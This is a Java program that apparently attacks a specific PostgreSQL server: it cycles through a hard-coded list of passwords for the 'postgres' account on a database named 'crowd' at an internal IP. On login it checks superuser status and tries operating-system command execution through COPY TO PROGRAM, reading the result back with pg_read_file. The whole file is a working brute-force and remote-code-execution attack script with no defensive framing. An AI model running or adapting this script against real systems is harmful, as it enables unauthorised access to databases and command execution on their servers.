import java.sql.*;
class PGS {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    String[] passes = {"postgres","atlassian","kutul0nc4t","password","admin","canigonow","bukanpassword","cpssoft","accurate"};
    for (String p : passes) {
      try {
        Connection c = DriverManager.getConnection("jdbc:postgresql://10.14.36.23:5432/crowd", "postgres", p);
        System.out.println("POSTGRES_LOGIN_OK pass=" + p);
        Statement s = c.createStatement();
        ResultSet r = s.executeQuery("SELECT current_user, usesuper FROM pg_user WHERE usename = current_user");
        while (r.next()) System.out.println("user=" + r.getString(1) + " super=" + r.getString(2));
        try {
          s.execute("COPY (SELECT 'rce_test') TO PROGRAM 'id > /tmp/.rce_check'");
          r = s.executeQuery("SELECT pg_read_file('/tmp/.rce_check')");
          while (r.next()) System.out.println("RCE=" + r.getString(1));
        } catch (Exception e2) {
          System.out.println("COPY_ERR=" + e2.getMessage());
        }
        c.close();
        break;
      } catch (Exception e) {
        System.out.println("FAIL pass=" + p);
      }
    }
  }
}
